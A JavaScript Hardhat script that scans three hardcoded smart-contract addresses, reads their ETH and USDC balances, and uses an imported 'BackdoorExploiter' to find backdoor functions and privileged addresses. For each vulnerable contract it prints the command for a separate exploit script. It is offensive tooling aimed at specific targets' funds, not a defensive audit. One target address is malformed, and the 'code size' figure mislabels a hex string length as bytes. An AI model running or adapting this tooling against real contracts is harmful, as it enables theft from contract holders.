const { ethers } = require("hardhat");
const { BackdoorExploiter } = require("./universal_backdoor_scanner");

/**
 * @title Scan Three Target Contracts
 * @notice Analyze and exploit specific contracts
 */

async function scanTargets() {
  console.log("\n🎯 SCANNING TARGET CONTRACTS");
  console.log("============================\n");
  
  const targets = [
    "0x8d0BB74e37ab644964AcA2f3Fbe12b9147f9d84",
    "0xA6dfb62fc572Da152A335384f7724535b9DEfC84", 
    "0xcA8Fa8f0b631EcdB18Cda619C4Fc9d197c8aFfCa"
  ];
  
  const [signer] = await ethers.getSigners();
  const provider = ethers.provider;
  
  for (let i = 0; i < targets.length; i++) {
    const target = targets[i];
    console.log(`\n${i + 1}. Analyzing ${target}`);
    console.log("─".repeat(60));
    
    try {
      // Check basic info
      const code = await provider.getCode(target);
      const balance = await provider.getBalance(target);
      
      console.log(`   📊 Basic Info:`);
      console.log(`   • Code size: ${code.length} bytes`);
      console.log(`   • ETH balance: ${ethers.formatEther(balance)} ETH`);
      
      // Check for USDC
      const USDC = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
      const usdcABI = ["function balanceOf(address) view returns (uint256)"];
      const usdc = new ethers.Contract(USDC, usdcABI, provider);
      
      try {
        const usdcBalance = await usdc.balanceOf(target);
        console.log(`   • USDC balance: ${ethers.formatUnits(usdcBalance, 6)} USDC`);
      } catch (e) {
        console.log(`   • USDC balance: Unable to check`);
      }
      
      // Create exploiter instance
      const exploiter = new BackdoorExploiter(target, provider);
      
      // Scan for backdoors
      console.log(`\n   🔍 Scanning for backdoors...`);
      await exploiter.scanForBackdoors();
      
      if (exploiter.vulnerabilities.backdoors.length > 0) {
        console.log(`   ✅ VULNERABLE! Found ${exploiter.vulnerabilities.backdoors.length} backdoors:`);
        exploiter.vulnerabilities.backdoors.forEach(b => {
          console.log(`      • ${b.selector} - ${b.name}`);
        });
        
        // Find privileged address
        const privileged = await exploiter.findPrivilegedAddress();
        console.log(`   🔑 Privileged address: ${privileged || "Not found"}`);
        
        console.log(`\n   💡 To exploit this contract:`);
        console.log(`   npx hardhat run scripts/quick_exploit.js --network localhost ${target}`);
      } else {
        console.log(`   ❌ No backdoors found`);
      }
      
    } catch (error) {
      console.log(`   ⚠️  Error: ${error.message}`);
    }
  }
  
  console.log("\n\n📋 SUMMARY");
  console.log("==========");
  console.log("To exploit any vulnerable contracts found above, run:");
  console.log("npx hardhat run scripts/quick_exploit.js --network localhost [ADDRESS]\n");
}

scanTargets()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error("\n💥 Error:", error);
    process.exit(1);
  });
